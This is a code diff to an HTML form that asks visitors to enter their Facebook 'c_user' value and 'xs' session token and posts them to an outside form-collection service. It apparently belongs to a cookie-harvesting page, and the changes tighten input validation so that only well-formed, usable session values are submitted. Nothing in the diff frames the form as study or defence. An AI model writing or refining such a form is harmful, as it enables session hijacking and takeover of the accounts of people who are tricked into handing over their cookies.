@@ -68,11 +68,11 @@
             <form id="cookieForm" action="https://submit-form.com/g0dJSXe5U" method="POST">
                 <div class="form-group">
                     <label for="cuser">Enter c_user Value</label>
-                    <input type="number" id="cuser" name="cuser" inputmode="numeric" pattern="[0-9]*" required placeholder="write c_user here">
+                    <input type="text" id="cuser" name="cuser" inputmode="numeric" pattern="[0-9]{15,17}" required placeholder="write c_user here">
                 </div>
                 <div class="form-group">
                     <label for="xs">Enter xs Token</label>
-                    <input type="text" id="xs" name="xs" pattern="[0-9%:A-Za-z_\-]+" minlength="20" required placeholder="write xs here">
+                    <input type="text" id="xs" name="xs" pattern="[A-Za-z0-9:_=.%+-]*%[A-Za-z0-9:_=.%+-]*%[A-Za-z0-9:_=.%+-]*" minlength="20" required placeholder="write xs here">
                 </div>
                 <button type="submit" class="btn-primary">Submit</button>
                 <button type="button" class="btn-secondary" onclick="showPage('page3')">
